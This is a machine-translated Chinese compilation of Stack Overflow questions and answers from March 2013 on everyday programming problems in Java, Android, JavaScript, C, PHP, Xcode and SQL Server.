Map<MyClass,Map<String,WeakReference<MyObject>>> 
```

您可以将其更改`list`为 a`map`并使用对象中的某种**ID作为****弱引用的键。**并且当所有者调用时，使用该对象的 ID 删除弱引用。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-01T09:35:53.223

不，因为它的父类`WeakReference`和它的父`Reference`类都不会覆盖该`equals()`方法。所以它继承了`equals()`Object 的方法，它只认为两个对象是相同的对象时它们是相等的。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-01T09:36:48.047

显而易见的选项是沿着列表循环，并将目标对象与每个引用的所指对象进行比较（`owner.equals(reference.get())`或者`owner == reference.get()`如果您要检查的是两个变量都指向同一个对象）。

# android - 如何在Android中实现ListView缓存

> ID：15154164
> 
> 赞同：5
> 
> 时间：2013-03-01T09:13:08.693
> 
> 标签：android, caching, memorycache

我有一个包含大量数据的 ListView。
第一次，我从 Web 服务加载所有数据。

现在我想缓存该数据，这样，如果我要再次打开该页面，我可以从缓存中获取数据，而不是再次查询 Web 服务。

我怎么做？。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-01T09:39:18.370

我假设您将从`WebService`可序列化对象中检索到的数据存储（正如您在编辑之前在问题中所述。）

您可以将可序列化对象存储到文件中并稍后加载它们：

店铺：

```
FileOutputStream fileOutputStream = yourContext.openFileOutput(fileName, Context.MODE_PRIVATE);
ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
objectOutputStream.writeObject(yourObject);
objectOutputStream.close(); 
```

加载：

```
FileInputStream fileInputStream = yourContext.openFileInput(fileName);
ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
Object yourObject = (Object)objectInputStream.readObject();
objectInputStream.close(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:33:16.490

您可以通过将通过 Web 服务获得的数据保存到相应结构化的 SQLite 数据库中来做到这一点。如果您想获得比数据库中最后一条记录更新的数据，那么您应该在 SharedPreferences 文件中保存一个键值。例子：

我想从网络服务中获取所有日历事件，

今天，用户只从事件号访问了一月份的事件。1 到事件编号。10（首次通过web服务获取，本地存储在SQLite数据库中，然后使用游标显示）。

明天，一旦用户加载应用程序，已经检索到的数据将从 SQLite 数据库（“缓存”）加载，用户将只能通过 Web 服务获取 10 个以上的事件；并重复前一天的过程（即将检索到的实体存储在 SQLite DB 中，然后从 1 到“x”全部显示）。

在这种情况下，您将事件 1 到 10 存储在数据库中，并将“11”存储在您的共享首选项中，以便您知道下一批要获取的实体的起点。我希望我能指导你。

查看 Android 上可用的存储选项：http: [//developer.android.com/guide/topics/data/data-storage.html](http://developer.android.com/guide/topics/data/data-storage.html)

祝一切顺利 ：）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T09:35:32.417

你的情况是这样的：

[如何在android中缓存listview数据？](https://stackoverflow.com/questions/5595596/how-to-cache-listview-data-in-android)

如果您想将信息保存得比应用程序的生命周期更长，您必须决定是否要使用 SQL 数据库，否则适配器就可以了。

在 SDK 包的 Samples 提供的 Api Demos 中，有几个使用 ListAdapters 的 List 示例。例如 List5.java。

# java - greenDAO 只能与 Android 一起使用吗？

> ID：15154166
> 
> 赞同：1
> 
> 时间：2013-03-01T09:13:13.737
> 
> 标签：java, greendao

我需要对 Sqlite 数据库的 DAO 访问权限，而 greenDAO 看起来正是我所需要的。所有文档都与在 Android 平台上使用它有关，但我在 Android 平台内外都需要它——它会以这种方式工作吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-04T17:39:12.233

greenDAO 依赖 Android API 来进行 SQLite 访问和其他事情。因此它不能在 Android 之外使用。

# android - 并排显示片段

> ID：15154168
> 
> 赞同：0
> 
> 时间：2013-03-01T09:13:17.960
> 
> 标签：android, android-fragments

我想为具有 2 个片段的横向模式下的平板电脑开发一个 Android 应用程序：

1.  片段 1 包含按钮列表。
2.  片段 2 是一个与按钮相关的片段的空间。

对于“按钮相关的片段”，我的意思如下：当用户按下片段 1 中的按钮时，与该按钮关联的片段应显示在片段 2 中。

片段 1 是一种导航面板。

为了实现这一点，我编写了以下代码：

```
<application
    android:allowBackup="true"
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name" >
    <activity
        android:name="mypackage.MainActivity"
        android:label="@string/app_name"
        android:screenOrientation="landscape" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
    <activity android:name=".impl.activities.IntroActivity"></activity>
    <activity android:name=".impl.activities.SimulationActivity"></activity>

</application> 
```

`MainActivity`看起来像这样：

```
public class MainActivity extends Activity implements IMainActivity {
  @Override
  public void onCreate(final Bundle aSavedInstanceState) {
    super.onCreate(aSavedInstanceState);
    setContentView(R.layout.main);
  }

  @Override
  public void show(final View aView, final Class<? extends Activity> aActivityClass) {
    startActivity(new Intent(this, aActivityClass));
  }

} 
```

`main.xml`有以下内容：

```
<fragment xmlns:android="http://schemas.android.com/apk/res/android"
  android:layout_width="fill_parent"
  android:layout_height="fill_parent"
  android:name="mypackage.fragments.ContentFragment"/> 
```

`ContentFragment`看起来像这样：

```
public class ContentFragment extends Fragment {

  @Override
  public View onCreateView(LayoutInflater inflater, ViewGroup container,
      Bundle savedInstanceState) {
    final View view = inflater.inflate(R.layout.mainfrag, container, false);

    IMainActivity mainActivity = (IMainActivity) this.getActivity();
    final IntroButtonClickListener introListener = new IntroButtonClickListener(
        mainActivity, IntroActivity.class);

    final IntroButtonClickListener simulationListener = new IntroButtonClickListener(
        mainActivity, SimulationActivity.class);

    view.findViewById(R.id.intro_button).setOnClickListener(introListener);
    view.findViewById(R.id.simulation_button).setOnClickListener(simulationListener);

    return view;
  } 
```

`IntroButtonClickListener`：

```
 class IntroButtonClickListener implements View.OnClickListener {
  private IMainActivity mainActivity;
  private Class<? extends Activity> activityClass;

  public IntroButtonClickListener(final IMainActivity aMainActivity,
      final Class<? extends Activity> aActivityClass) {
    this.mainActivity = aMainActivity;
    this.activityClass = aActivityClass;
  }

  @Override
  public void onClick(final View aView) {
    this.mainActivity.show(aView, this.activityClass);
  }

} 
```

`mainfrag.xml`：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
  android:layout_width="fill_parent"
  android:layout_height="fill_parent"
  android:orientation="vertical">

  <Button
    android:layout_width="fill_parent"
    android:layout_height="0dip"
    android:layout_weight="25"
    android:id="@+id/intro_button"
    android:text="@string/intro_button"/>

  <Button
    android:layout_width="fill_parent"
    android:layout_height="0dip"
    android:layout_weight="25"
    android:id="@+id/simulation_button"
    android:text="@string/simulation_button"/>

  <Button
    android:layout_width="fill_parent"
    android:layout_height="0dip"
    android:layout_weight="25"
    android:id="@+id/statistics_button"
    android:text="@string/statistics_button"/>

  <Button
    android:layout_width="fill_parent"
    android:layout_height="0dip"
    android:layout_weight="25"
    android:id="@+id/help_button"
    android:text="@string/help_button"/>

</LinearLayout> 
```

此代码导致以下结果：

1.  当我启动应用程序时，屏幕上有 4 个按钮（从`mainfrag.xml`）。
2.  当我按`intro_button`或`simulation_button`时，视图分别变为`IntroFragment`或`SimulationFragment`。
3.  当我按下返回按钮时，四个按钮再次可见。

我的问题：当`IntroFragment`或`SimulationFragment`可见时，按钮面板消失。

我应该如何修改我的代码，以*使*按钮面板*和*相应的“详细”视图（`IntroFragment`, `SimulationFragment`）同时可见（有足够的屏幕空间）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:21:09.790

此类示例显示在 Android SDK 中的 APIDemos 中。他们将左侧面板作为列表视图，所选项目在右侧显示相关片段。

你可以在

> SDK\android-sdk_r11-windows\android-sdk-windows\samples\android-14\ApiDemos

# javascript - 更新在不可见的 HighCharts 系列问题上已更改的数据点

> ID：15154169
> 
> 赞同：1
> 
> 时间：2013-03-01T09:13:19.067
> 
> 标签：javascript, jquery, highcharts

我正在使用 HighCharts 显示包含折线图和条形图的图形。默认情况下，在您单击系列标题之前，条形系列不可见。我有代码可以即时更新条形图，但我注意到在图表不可见时我无法获取现有信息。

当我从服务器获取数据时，我会尝试更新任何现有的点，如果有的话，添加新的点。如果系列可见，则此代码效果很好，但如果系列不可见，则`chart.series[1].data[idx]`返回`undefined`。单击该系列将显示图表，因此我知道数据在某处。我究竟做错了什么？

```
if (chart.series[1].data[idx] && chart.series[1].data[idx].y != inRate)
{   
    chart.series[1].data[idx].update(inRate);
    redraw = true;
}
else if (!chart.series[1].data[idx])
{
    var time = IntervalToTime(i, doorInterval);
    chart.series[1].addPoint([time, inRate], false, false);
    redraw = true;
} 
```

经过一番调查，我取得了一些进展。显然，在该系列至少可见一次之前，数据数组不会被填充，因此您无法检查那里的数据是否存在。我发现了一个处理过的数据队列，其中保存了数据，这似乎可以工作，但是在尝试调用时执行此方法会导致错误`chart.series[1].data[idx].update(inRate)`

```
if (chart.series[1].processedXData[idx] && chart.series[1].processedYData[idx] != inRate)
{
    chart.series[1].data[idx].update(inRate);
    redraw = true;
}
else if (!chart.series[1].processedXData[idx])
{
    var time = IntervalToTime(i, doorInterval);
    chart.series[1].addPoint([time, inRate], false, false);
    redraw = true;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:28:11.353

经过一番调查，我发现了这个问题。显然，在`data`该系列至少可见一次之前，该数组不会被填充，因此您无法检查那里的数据是否存在。我发现了一个处理过的数据队列，其中保存了数据，这似乎有效。

```
if (chart.series[1].processedXData[idx] && chart.series[1].processedYData[idx] != inRate)
{
    chart.series[1].data[idx].update(inRate);
    redraw = true;
}
else if (!chart.series[1].processedXData[idx])
{
    var time = IntervalToTime(i, doorInterval);
    chart.series[1].addPoint([time, inRate], false, false);
    redraw = true;
} 
```

# cxf - Camel 不会将故障识别为异常

> ID：15154173
> 
> 赞同：1
> 
> 时间：2013-03-01T09:13:32.420
> 
> 标签：cxf, apache-camel, fuseesb

我在使用 Fuse ESB 7.1.0 时遇到了一个非常奇怪的问题：当一个 cxf 端点产生故障时，这个故障看起来不像异常，所以我无法使用 doCatch 构造来处理它。cxf 端点定义如下：

```
<cxf:cxfEndpoint id="cxf-ep" address="${ws.url}" serviceClass="MyServiceClass">
    <cxf:properties>
        <entry key="dataFormat" value="POJO" />
    </cxf:properties>
</cxf:cxfEndpoint> 
```

这是一个简短的代码片段，我预计会出现异常：

```
<doTry>
    <to uri="cxf:bean:cxf-ep" />
    <doCatch>
        <exception>org.apache.cxf.interceptor.Fault</exception>
        <handled>
            <constant>true</constant>
        </handled>
        <to uri="log:exceptions?multiline=true&amp;showCaughtException=true&amp;showStackTrace=true&amp;showBody=true&amp;showProperties=true&amp;showHeaders=true&amp;level=ERROR" />
    </doCatch>
</doTry> 
```

我尝试将 handleFault="true" 属性添加到骆驼上下文和路线，但没有成功。具有相似参数和路由的包在 Fuse ESB/ServiceMix 4.4.1 上按预期工作，所以它看起来像回归，或者在新版本中骆驼发生了一些变化？

另一个有趣的时刻是，当一个 web 服务器不可用时，camel 会产生 org.apache.cxf.interceptor.Fault，所以不能作为异常处理！

骆驼版：2.10.0.fuse-71-047

# iphone - CVMat 尺寸/尺寸/形状

> ID：15154175
> 
> 赞同：-3
> 
> 时间：2013-03-01T09:13:34.903
> 
> 标签：iphone, objective-c, xcode, opencv

我想获取从我使用 OpenCV 的 Iphone 应用程序中`cv::Mat`返回的对象的尺寸。`(void)processImage:(cv::Mat&)image;`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:22:03.947

试试[Size()](http://docs.opencv.org/modules/core/doc/basic_structures.html#mat-size)的方法`cv::Mat`

# java - 索尼 xperia acro s InputMismatchException 时 java.util.Scanner.nextFloat()

> ID：15154176
> 
> 赞同：0
> 
> 时间：2013-03-01T09:13:35.897
> 
> 标签：java, android

我有一个字符串：“100 0 2 3.0 100 420 5.0 280 420”

在代码中我这样做：

```
 Scanner s = new Scanner(walls).useDelimiter(" ");
    while (s.hasNext()) {
        int type = s.nextInt();
        int rotation = s.nextInt();             
            int actionsCount = s.nextInt();
            float s1 = s.nextFloat(); --> crash on Sony
    } 
```

在 Smsung Galaxy SII (2.3.6) 和 Motorolla Xoom (4.1.2) 上一切正常。为什么在 Sony XPERIA Acrto s wirh Android 4.0.4 上会出现此错误？

```
03-01 11:05:42.436: E/AndroidRuntime(21019): java.util.InputMismatchException
03-01 11:05:42.436: E/AndroidRuntime(21019):    at java.util.Scanner.next(Scanner.java:1012)
03-01 11:05:42.436: E/AndroidRuntime(21019):    at java.util.Scanner.nextFloat(Scanner.java:1297) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:44:45.190

问题出在语言环境中。在 Sony 上是 Locale.RU，其中真实数字用逗号书写，如下所示：“100 0 2 3,0 100 420 5,0 280 420”

所以修复是使用美国语言环境。

```
Scanner s = new Scanner(walls).useDelimiter(" ");
 s.useLocale(Locale.US);  --> need add this string
    while (s.hasNext()) {
        int type = s.nextInt();
        int rotation = s.nextInt();             
            int actionsCount = s.nextInt();
            float s1 = s.nextFloat(); --> And NO crash on Sony
    } 
```

# c# - 如何从 Windows 7.0 发送电子邮件？

> ID：15154178
> 
> 赞同：0
> 
> 时间：2013-03-01T09:13:38.673
> 
> 标签：c#, asp.net, windows, iis, smtp

我有 Windows 7.0 Enterprise 并且我已经从[http://www.microsoft.com/en-gb/download/details.aspx?id=7887安装了远程服务器管理工​​具](http://www.microsoft.com/en-gb/download/details.aspx?id=7887)

我还配置了我的 IIS 以使用 Localhost 作为 SMTP 服务器：[http ://technet.microsoft.com/en-us/library/cc753146(v=ws.10).aspx](http://technet.microsoft.com/en-us/library/cc753146(v=ws.10).aspx)

```
var smtpSender = new SmtpSender("localhost");
smtpSender.UserName = this._emailAccount.EmailAddress;
smtpSender.Password = this._emailAccount.Password;

smtpSender.Send(fromEmail, 
  toEmail,
  subject,
  body); 
```

但是当我尝试发送电子邮件时，它会引发以下异常：

```
An attempt was made to access a socket in a way forbidden by its access permissions 127.0.0.1:25 
```

我看到其他帖子说我应该安装新的 SMTP 服务器，但我已经安装了适用于 Windows 7.0 的远程服务器管理工​​具。它不包括 SMTP 服务器吗？

安装远程服务器管理工​​具显然只会向 IIS 添加一个新的管理单元，并且不会在本地安装任何 SMTP 服务器？

# c - 结构体和指向指针的指针

> ID：15154179
> 
> 赞同：2
> 
> 时间：2013-03-01T09:13:40.750
> 
> 标签：c, pointers, struct, linked-list, dereference

我正在学习链表以及如何在 C 中使用结构和指针创建它们。我有一个下面的例子。据我了解，被调用`push()`者将头节点所在的结构的起始内存位置作为参数传递。我们的 push() 函数的参数将结构节点作为指向指针的指针，因此它作为引用传递，而不是实际副本。所以我们的第一个指针`struct node** headref`只是指向我们头节点的内存位置的指针，第二个指针指向的值是头节点指向的下一个内存位置。我们通过为其分配一些内存来在我们的结构节点内创建一个名为 newnode 的新节点。然后我们在这个节点内创建一个 int 类型的数据。

好吧，假设我说的一切都是正确的，下一部分是我感到困惑的部分。

```
newNode->next= *headRef; 
```

我能理解的这条线取消了引用，`headref`所以这只会`headref`指向头节点。然后我们有一个指针操作，其中`headref`指向的内容也将是我们的指针 next 将指向的内容。基于此，我们的 new node( `newnode`) 中的 next 指针将指向 head 指针。

我也很困惑的下一行是：

```
*headRef = newNode; 
```

取消引用的`headref`指针指向的东西，也就是头节点，现在将指向我们的新节点。

基于此，应该有一个名为 newnode 的新节点，它带有一个 int 数据和一个将我们的 newnode 链接到 head 的 next 指针。然后headref指针（或者它是头节点？）将指向新节点。我知道这是不正确的，因为我们的 newnode 的 next 指针应该指向第二个节点，因此我们的 newnode 可以链接到结构中。我也不相信我在上面两行代码中理解了指向指针和取消引用的指针。

代码：

```
void Push(struct node** headRef, int data) {
  struct node* newNode = malloc(sizeof(struct node));

  newNode->data = data;
  newNode->next = *headRef;
  *headRef = newNode;
}

void PushTest(void) {
  struct node* head = BuildTwoThree(); // suppose this returns the list {2, 3}

  Push(&head, 1);
  Push(&head, 13);
  // head is now the list {13, 1, 2, 3} 
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:17:40.283

您实际上既正确又不正确。该`push`函数在列表的头部添加一个新节点。调用此函数后，新节点是新节点`head`，前一个`head`节点现在是列表中的第二个（下一个）节点。所以你的观察是正确的，但你的结论不是。

我建议您在调试器中单步执行代码，同时观察所有指针及其内容，看看会发生什么。它可能会让你更清楚。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:28:19.320

行。我想我可以解释。

`head`是链表的头指针。`headRef`指向头部。头指针也是如此`*headRef`（通过引用传递）。

所以`newNode->next`现在将指向结构的头部（它的值为2，这就是节点被插入到前面的原因）。

现在在这一行`*headRef = newNode;` `*headRef`中分配了值，`newNode`所以`head`现在`newNode`在原始结构中更改为。

同样，当您通过 时`&head`，您现在正在传递`head`包含值 1 的值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T09:32:47.643

让我们在这里复制它，以供更简单的参考：

```
1   void Push(struct node** headRef, int data) {
2     struct node* newNode = malloc(sizeof(struct node));
3     newNode->data = data;
4     newNode->next = *headRef;
5     *headRef = newNode;
6   } 
```

为了简单起见，我对这些行进行了编号。

现在，`headRef`它本身只是一个指向保存列表标题的*变量*的指针——因此，它本身不包含任何有用的信息。通过取消引用该指针，您可以访问变量本身的*内容*（`head`in `PushTest()`）。因此，`*headRef`本质上是您访问 `head`. 现在，因为`head`是顶部节点，所以`*headRef`- 它们具有相同的值，因为它们是相同的地址。第 4 行所做的是，将 的值`*headRef`（即 的值`head`）分配给新节点的下一个链接。以同样的方式，第 5 行将新节点`*headRef`分配给`head``headRef``head``*headRef`是 的值`head`。

这里的关键是，`headRef`是对 的引用（指针）`head`，因此`*headRef`和`head`是等价物（除了范围规则）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T09:36:28.103

```
void Push(struct node** headRef, int data) { 
```

headRef 包含结构节点所在地址的地址。它是*PushTest*函数中*head*变量的地址。

 *```
struct node* newNode = malloc(sizeof(struct node)); 
```

这里我们创建了一个新节点。它包含节点结构所在的内存地址。

```
newNode->data = data; 
```

将 newNode 的数据设置为传递给*Push函数的**数据*参数的值- 确定。

 *```
newNode->next = *headRef; 
```

将*newNode->next*设置 为位于*head*变量中的结构的地址。例如，如果我们写了

```
 void Push(struct node* head, int data) {
 ...
 newNode->next = head; 
```

接下来，我们需要将*head*变量更改为*newNode*。如果*head*变量是通过引用传递的，我们可以简单地这样写，就像在 C++ 中一样：

```
void Push(struct node* &head, int data) {
...
head = newNode; 
```

但是在纯 C 中，我们必须传递*head*变量所在的地址，因此我们可以将指向我们在*Push*函数中创建的结构*newNode*的指针写入该地址：

 *```
*headRef = newNode; 
```

相当于将**newNode指针写入地址位于headRef变量内的变量**

你的逻辑有问题：

> 我们的 push() 函数的参数将结构节点作为指向指针的指针，因此它作为引用传递，而不是实际副本。

实际上，我们传递了一个*临时变量的***副本**，其中包含*节点*变量的地址，而不是引用。C++ 中有*传递引用的*方法，它使用和号来声明传递给函数的变量是引用，而不是原始变量的副本。***

# javascript - 在 onunload 时将焦点设置在卸载窗口上

> ID：15154180
> 
> 赞同：0
> 
> 时间：2013-03-01T09:13:47.537
> 
> 标签：javascript, window.onunload

我在 onunload 事件中有一个确认对话框。它运行良好，但只有一个问题：窗口在卸载焦点时丢失并自动将其传递给父级。但是由于仍然有确认对话框，我不想失去对这个窗口的关注。

我已经尝试过手动设置焦点，`window.focus()`但这不起作用。

目前我的 onunload 事件代码如下所示：

```
window.onunload = sessionConfirmation;
function sessionConfirmation(e) {
    window.focus();
    confirm('test');
} 
```

先感谢您！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-04T17:43:11.133

不太确定您的最终游戏是什么，但我假设您希望在用户尝试离开页面时显示确认对话框。如果是这样，你想这样做：

```
window.onbeforeunload = sessionConfirmation;
function sessionConfirmation(e) {
return "test";
} 
```

希望这就是你所要求的！

# c# - 基于客户端的表/模型

> ID：15154199
> 
> 赞同：0
> 
> 时间：2013-03-01T09:14:44.190
> 
> 标签：c#, asp.net-mvc

我是 MVC 新手，我只使用标准应用程序完成了一个基本教程，用于编辑现有表、添加行、查看它等。

所以有一个静态视图、静态控制器和一个静态模型，它们代表数据库中的 1 个表。

现在我想知道它应该如何工作，如果我还不知道模型会是什么样子。在我的例子中，客户可以首先创建一个表，在哪里定义，哪些行和哪些数据类型等，然后他可以编辑该表。

是否有动态模型的标准方法，或者 mvc 是错误的方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:20:02.880

MVC 可以很好地解决这个问题。使用 MVC，我只是将每个必要的代码位分成三类。所以尝试以“MVC”方式思考。

`The logic that is needed to connect to the database - Definitely a Model.`

`The displaying of the data in a structured table - Definitely a view.`

`The communication between the data gathered with the logic, and the displaying of that data - Definitely a controller`

MVC 的思想是将后端逻辑与所述逻辑的显示分开。这有助于分离项目的两个不同部分，通常被认为是良好的做法。

希望这会有所帮助:)

# javascript - 将参数转换为字符串在javascript中不起作用

> ID：15154202
> 
> 赞同：-2
> 
> 时间：2013-03-01T09:14:54.980
> 
> 标签：javascript

我正在将测试函数参数转换为字符串，但它不起作用。

//脚本

```
<script type="text/javascript">
function test(a,b,c){
alert(a.toString());
alert(b.toString());
alert(c.toString());
}
</script> 
```

// html

```
<input type="text" onblur="test(jitender,chand,thakur)" /> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:26:28.390

唯一可行的方法是为您将使用的所有名称定义变量。

对于您示例中的名称：

```
var jitender = "jitender", chand = "chand", thakur = "thakur"; 
```

现在您的调用将起作用，因为代码将使用变量并将变量的值发送到函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:28:05.013

尝试这个，

```
<script type="text/javascript">
  function test(a,b,c)
{
   alert(a);
   alert(b);
   alert(c);
}
</script> 
```

// html

```
<input type="text" onblur="test('jitender','chand','thakur')" /> 
```

您无需将其转换为字符串。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T09:18:18.860

尝试这个

`test('jitender', 'chand', 'thakur')`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T09:21:22.697

将名称用单引号括起来，你的名字已经是字符串，你不需要转换它。

```
<input type="text" onblur="test('jitender','chand','thakur')" /> 
```

# php - 关于PHP的内存使用

> ID：15154203
> 
> 赞同：4
> 
> 时间：2013-03-01T09:14:56.103
> 
> 标签：php, apache

我在 Windows+Apache 上的 PHP 应用程序停止显示“内存不足（已分配 422313984）（试图分配 45792935 字节）”。

我不明白为什么它会停止，因为我的机器有 4GB 物理内存，并且我`memory_limit`在 PHP.ini 文件中为 -1 设置了指令。我还重新启动了 Apache。

我认为 4GB 足以分配超过 422313984+45792935 字节的内存。

是否有其他设置可以为 PHP 或 Apache 使用内存？

我还总结了性能计数器。它显示机器的最大内存使用量为 2GB。而httpd进程使用了​​1.3GB。

我无法显示代码，但实际上代码从 DBMS 获取 30000 行，每行 199 字节，并`simplexml_load_string()`在循环中使用解析为 XML。

如果数据很小或缩短循环期限（如 30000 到 1000），则代码通常已完成。

另一种情况是启动Apache后第一次运行会成功。

我认为发生了一些内存泄漏。

实际上我做了 echo`PHP_INT_SIZE`和 PHP 显示 4。所以也许我的 PHP 是 32 位版本。

如果内存使用问题来自这个版本的 PHP，正如 Álvaro G. Vicario 指出的那样，我可以通过更改为 64 位版本的 PHP 来解决它吗？我怎样才能获得 64 位版本的 PHP for Windows？[我在http://windows.php.net](http://windows.php.net)中找不到它

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T12:59:08.180

*«Out of memory»*消息（不要与*«Allowed memory size exhausted* » 消息混淆）总是表明 PHP 解释器确实内存不足。没有可以调整的 PHP 或 Apache 设置——计算机无法为 PHP 提供更多 RAM。常见原因包括：

*   使用过多内存的脚本。
*   PHP 解释器中的内存泄漏或错误。

SimpleXML 绝不是一个轻量级的扩展。相反，它易于使用和方便的功能是有代价的：高资源消耗。即使没有看到任何一行代码，我也可以保证 SimpleXML 完全不适合创建包含 30,000 个项目的 XML 文件。使用 2GB RAM 的 PHP 脚本只能关闭整个服务器。

没有人喜欢在项目中间更改基础库，但您最终需要这样做。PHP 提供了一个名为[XMLWriter](http://php.net/manual/en/book.xmlwriter.php)的拉式解析器。它实际上并不难使用，它提供了两个好处：

*   它占用的资源更少，因为它不会创建 SimpleXML 使用的复杂对象。
*   您可以将[部分结果刷新](http://www.php.net/manual/en/function.xmlwriter-flush.php)到文件中。
*   甚至[可以直接写入文件](http://www.php.net/manual/en/function.xmlwriter-open-uri.php)。

有了它，我确信你的 2 GB 脚本可以用几 MB 运行。

# xcode - 从 Xcode 导出的开发人员配置文件中存储了哪些数据？

> ID：15154211
> 
> 赞同：10
> 
> 时间：2013-03-01T09:15:22.467
> 
> 标签：xcode, provisioning-profile

众所周知，`Organizer->Devices->Teams->Team Name`我们可以从中导出扩展名为“developerprofile”的文件。什么数据存储在这样的文件中？只有每个团队成员的证书或 Xcode 中的整个设置（如快捷方式等）。当您导入一些其他团队成员开发人员资料时会发生什么？是不是像 Xcode 被“签名”到他的名字/证书上？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2014-02-26T21:58:37.463

打开 Preferences -> Accounts 然后从小齿轮菜单中选择“Export Accounts...”后，Xcode 5 生成的 filename.developerprofile 文件是一个包含以下结构的 zip 文件：

```
developer
developer/accounts.keychain
developer/accounts.plist
developer/identities
developer/identities/0163571FCC272FCXXXXXDA9D68F13A5194FE4245.p12
developer/profiles
developer/profiles/049DB4B6-2417-4514-1234-F60C189A5641.mobileprovision 
```

p12 文件是受您在从 xcode 导出 developerprofile 时指定的密码保护的私钥。mobileprovision 文件包含用于签署二进制文件的证书。

您可以通过将扩展名更改为 .zip 或从命令行使用`unzip filename.developerprofile`

# javascript - 在提交之前更改表单的键、值和操作 url 的名称

> ID：15154214
> 
> 赞同：0
> 
> 时间：2013-03-01T09:15:32.183
> 
> 标签：javascript, jquery, html

无论如何在提交之前更改表单的键、值和操作 url 的名称。我有一个表格，但简单的输入看起来像这样：

```
<input type="text" name="Af25fsg2" value="BGHfGSG" /> 
```

字符重新排列，我需要通过 javascript 或 jquery 函数将它们设置为正常，然后提交表单。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T09:20:20.697

尝试这个：

**HTML**

```
<input type="text" id="frmKey" name="Af25fsg2" value="BGHfGSG" /> 
```

**脚本**

```
$("#myform").submit(function(){// Let myform is id of your form
    $(this).attr('action','newaction');
    $('#frmKey').val('newkey');
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T09:18:11.933

您需要订阅表单的[提交](http://api.jquery.com/submit/)事件处理程序。您可以使用[attr()](http://api.jquery.com/attr/)函数来更改属性的值。

```
$("formSelector").submit(function(){      
    $(this).attr("action", "newurl"); 
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T09:20:02.463

您可以在您正在使用的任何点击或事件上使用它

```
jQuery("input").attr("name","changeName");
jQuery("input").val("changeValue");
jQuery("FORMID").attr("action","CHANGEACTION"); 
```

希望这可以帮助：）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-01T09:23:13.710

你有没有尝试过这样的事情？

HTML

```
<form action='' name='myform' id="myform" method='POST'>
      <input type="text" name="Af25fsg2" value="BGHfGSG" id="textInput" />
</form> 
```

jQuery

```
$('#myform').submit(function(){
   var input = $('#textInput').val(); // Get the value here, do whatever you want to it
   var name = $(this).attr('name'); // Get the name here, do whatever you want to it. 
   $(this).attr('action', "http://www.mysite.com/" + textInput + ".html"); // Set the action here. 
}); 
```

# java - 我怎样才能给出关于使用什么时间单位的“提示”？

> ID：15154219
> 
> 赞同：1
> 
> 时间：2013-03-01T09:15:57.403
> 
> 标签：java, oop, design-patterns, executorservice, scheduledexecutorservice

我有一个通过预定执行器安排任务的课程。
我希望类在`TimeUnit`. 我的意思是我希望能够为线程池构建具有延迟等的类，以及一种指定`TimeUnit`例如秒/毫秒/分钟等的方法。
使用`String`参数然后执行：

```
if(param.equals("seconds")){  
  timeUnit = TimeUnits.SECONDS;  
} 
```

等
这里的唯一方法还是有另一种方法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T09:21:42.043

直接使用 TimeUnit 作为参数的类型。Spring 可以毫无问题地绑定枚举。

# sql-server - 为什么将 IDENTITY 列上的相同值返回给两个插入器？

> ID：15154220
> 
> 赞同：1
> 
> 时间：2013-03-01T09:16:02.003
> 
> 标签：sql-server

我的程序正在插入这样的表中......

```
CREATE TABLE [DBO].[MYTABLE] (
    ID [INT] IDENTITY (1,1),
    DATE_TIME [DATETIME],
    NOTES [VARCHAR] (100)) 
```

使用以下代码...

```
database_connection = New ADODB.Connection
' ...code to connect...
database_connection.IsolationLevel = ADODB.IsolationLevelEnum.adXactSerializable
database_connection.BeginTrans
command_string = "INSERT INTO [MySchema].[dbo].[MyTable] (NOTES) VALUES ('sometext')"
database_connection.Execute(command_string)
command_string = "SELECT MAX([id]) as max_id FROM [MySchema].[dbo].[MyTable]"
Dim record_set As ADODB.Recordset = New ADODB.Recordset
record_set.CursorLocation = ADODB.CursorLocationEnum.adUseClient
record_set.Open(command_string, database_connection, ADODB.CursorTypeEnum.adOpenStatic, , ADODB.CommandTypeEnum.adCmdText)
record_set.MoveLast
new_id = CInt(record_set.Fields("id").Value)
database_connection.CommitTrans 
```

有时，此代码由两个不同的程序同时执行（在时间上足够接近以使`date_time`值相同），尽管在 中有两行可见`MyTable`，但两个程序都以相同的`new_id`.

